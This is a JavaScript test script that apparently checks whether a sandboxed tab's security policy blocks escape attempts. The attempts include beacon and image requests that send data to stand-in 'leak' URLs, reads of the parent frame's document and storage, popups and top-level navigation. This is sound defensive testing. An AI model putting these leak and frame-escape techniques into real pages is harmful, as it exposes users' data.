// Each attempt records its result, or "blocked: <why>". Network attempts
// count as blocked only when the page's policy reports blocking them, so an
// ordinary network failure cannot pass for the seal.
(async () => {
  const report = { inlineScript: window.inlineRan === true, externalScript: true, origin: self.origin, framed: window.top !== window };
  const violations = [];
  document.addEventListener('securitypolicyviolation', event => violations.push({ directive: event.effectiveDirective, uri: String(event.blockedURI) }));
  const attempt = async (name, run) => {
    try { report[name] = await run(); } catch (error) { report[name] = 'blocked: ' + (error && error.name || error); }
  };
  // policyBlocked runs trigger and waits for the policy to report a URL
  // starting with prefix.
  const policyBlocked = (prefix, trigger) => new Promise(resolve => {
    trigger().catch(() => {});
    let waited = 0;
    const poll = setInterval(() => {
      const seen = violations.find(violation => violation.uri.startsWith(prefix));
      if (seen) { clearInterval(poll); resolve('blocked: ' + seen.directive); }
      else if ((waited += 100) >= 3000) { clearInterval(poll); resolve('not blocked by the policy'); }
    }, 100);
  });
  await attempt('apiFetch', () => policyBlocked(location.origin, () =>
    fetch('/api/memory/proposals/list', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' })));
  await attempt('externalFetch', () => policyBlocked('https://example.com', () => fetch('https://example.com/')));
  await attempt('webSocket', () => policyBlocked('ws://127.0.0.1:9', async () => { new WebSocket('ws://127.0.0.1:9/'); }));
  await attempt('beacon', () => policyBlocked('https://example.org', async () => { navigator.sendBeacon('https://example.org/leak', 'x'); }));
  await attempt('imageLeak', () => policyBlocked('https://example.net', async () => { new Image().src = 'https://example.net/leak.png'; }));
  await attempt('localStorage', () => { localStorage.setItem('evie-tab', 'x'); return 'writable'; });
  await attempt('parentDocument', () => report.framed ? 'read: ' + window.parent.document.title : 'not framed');
  await attempt('parentStorage', () => report.framed ? 'read: ' + window.parent.localStorage.length : 'not framed');
  await attempt('popup', () => window.open('/') ? 'opened' : 'blocked: null');
  await attempt('topNavigation', () => { if (report.framed) window.top.location.href = '/#tab-escaped'; return report.framed ? 'attempted' : 'not framed'; });
  report.violations = violations;
  document.getElementById('report').textContent = JSON.stringify(report);
  if (report.framed) window.parent.postMessage({ hostileTab: report }, '*');
})();
